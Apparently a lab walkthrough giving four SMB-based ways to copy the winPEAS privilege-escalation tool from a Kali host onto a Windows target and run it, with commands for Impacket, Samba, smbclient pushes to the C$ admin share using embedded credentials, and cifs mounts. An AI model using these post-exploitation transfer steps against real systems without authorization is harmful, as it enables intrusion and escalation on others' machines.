step-by-step procedures for the main SMB options you can use from Kali to transfer winPEASany.exe to a Windows lab machine. I assume you have written authorization and are working in a controlled lab. Make snapshots before testing and only run commands you understand.

Option A — Quick SMB server using Impacket smbserver.py (target pulls from Kali)

This is the fastest method for labs: you run a simple SMB server on Kali and the Windows host copies from it.

Prepare file on Kali

mkdir -p /tmp/share
cp ~/Downloads/winPEASany.exe /tmp/share/
cd /tmp/share
sha256sum winPEASany.exe    # note the hash for later verification


Install Impacket (if needed)

sudo apt update
sudo apt install python3-pip -y
sudo pip3 install impacket
# or: sudo apt install impacket-scripts   (if distro package available)


Start the SMB server
Find the path to smbserver.py (might be in /usr/bin, /usr/local/bin, or the impacket package location):

which smbserver.py || locate smbserver.py


Start server (expose /tmp/share as share):

sudo python3 /usr/bin/smbserver.py share /tmp/share -smb2support


If the script is in a different path use that path. You may need sudo to bind/listen on port 445.

Verify from Windows target
On the Windows machine (Evil-WinRM / interactive shell):

Test-NetConnection -ComputerName 10.10.15.69 -Port 445
dir \\10.10.15.69\share\


Copy the file on the Windows target

Copy-Item -Path "\\10.10.15.69\share\winPEASany.exe" -Destination "C:\Users\svc-alfresco\Desktop\winPEASany.exe"
# or from cmd:
copy \\10.10.15.69\share\winPEASany.exe C:\Users\svc-alfresco\Desktop\winPEASany.exe


Verify integrity and run
On Windows:

certutil -hashfile C:\Users\svc-alfresco\Desktop\winPEASany.exe SHA256
# compare with the sha256 value you noted on Kali
& "C:\Users\svc-alfresco\Desktop\winPEASany.exe"


Stop server and cleanup (on Kali)
Ctrl+C the smbserver.py process. Remove files if needed and record logs/hashes for the report.

Option B — Use native Samba (smbd) on Kali (proper daemon, persistent share) — target pulls

Useful if you want a more production-like share or need authentication control.

Install Samba

sudo apt update
sudo apt install samba -y


Create share directory and copy file

sudo mkdir -p /srv/smb/share
sudo cp ~/Downloads/winPEASany.exe /srv/smb/share/
sudo chown nobody:nogroup /srv/smb/share
sudo chmod 755 /srv/smb/share
sha256sum /srv/smb/share/winPEASany.exe   # note hash


Edit Samba config
Open /etc/samba/smb.conf and add (at end):

[labshare]
   path = /srv/smb/share
   browsable = yes
   read only = yes
   guest ok = yes
   force user = nobody


If you want write access and authentication, configure a user and set read only = no.

Restart Samba

sudo systemctl restart smbd
sudo systemctl status smbd


Verify from Windows target

dir \\10.10.15.69\labshare\
Copy-Item \\10.10.15.69\labshare\winPEASany.exe C:\Users\svc-alfresco\Desktop\winPEASany.exe


Verify hash and run on Windows (same commands as above).

Cleanup
Remove file from /srv/smb/share if needed and stop Samba or revert config:

sudo rm /srv/smb/share/winPEASany.exe
sudo systemctl stop smbd

Option C — Push file to Windows from Kali using smbclient (Kali → Windows) — requires valid credentials or writable share

Use this if the Windows host exposes a writable share (or Admin share like C$ with credentials), and you have credentials.

Check credentials / availability
If you have username/password and the target allows SMB auth:

smbclient -L //10.10.15.69 -U 'DOMAIN\username'
# or
smbclient -L //10.10.15.69 -U username


Copy the file using smbclient
Interactive method:

smbclient //10.10.15.69/C$ -U 'svc-alfresco'   # you'll be prompted for password
# then in smbclient prompt:
put /path/to/winPEASany.exe "C:\\Users\\svc-alfresco\\Desktop\\winPEASany.exe"
exit


One-liner (if you trust embedding password):

smbclient //10.10.15.69/C$ -U svc-alfresco%Password123 -c "put /tmp/share/winPEASany.exe C:\\Users\\svc-alfresco\\Desktop\\winPEASany.exe"


If the target exposes a standard share like \\10.10.15.69\share:

smbclient //10.10.15.69/share -U username%password -c "put /tmp/share/winPEASany.exe winPEASany.exe"


Verify on Windows
Check file exists on Desktop and verify hash with certutil.

Cleanup
Remove uploaded file when done if the scenario requires it.

Note: Pushing to Admin shares (C$) requires administrative credentials on the target.

Option D — Use smbclient mount via cifs and cp (Kali mounts remote share locally) — requires share with access

You can mount the Windows share locally on Kali with mount.cifs, then copy the file.

Install cifs-utils

sudo apt update
sudo apt install cifs-utils -y


Create mount point and mount

sudo mkdir -p /mnt/winshare
sudo mount -t cifs //10.10.15.69/share /mnt/winshare -o username=svc-alfresco,domain=DOMAIN
# you'll be prompted for password; for admin share:
# sudo mount -t cifs //10.10.15.69/C$ /mnt/winshare -o username=Administrator


Copy file

cp /tmp/share/winPEASany.exe /mnt/winshare/winPEASany.exe
sync


Unmount

sudo umount /mnt/winshare


Verify on Windows and clean up (hash, execution, etc.)

Additional checks, precautions and troubleshooting (applies to all options)

Ports & firewall: SMB uses TCP 445 (and sometimes 139). Ensure Kali firewall allows listening and the Windows host can reach Kali on that port (Test-NetConnection or telnet 10.10.15.69 445 on Windows).

Permissions: For push methods you need valid credentials with write access; for pull methods the Windows host only needs network access to Kali.

SMB versions: Modern Windows may disable SMBv1; prefer SMB2/SMB3. smbserver.py -smb2support or Samba configuration handles SMB2/3.

Hashes: Always compute SHA256 on Kali and verify via certutil -hashfile on Windows after transfer.

AV / EDR: AV or endpoint protection may block the binary. In a lab, note AV events rather than attempting to bypass them.

Logs & snapshots: Take VM snapshot before testing and keep logs for your report (commands, timestamps, hashes).

Least privilege & ethics: Only run in authorized lab. Don’t attempt to extend to production or third-party networks.
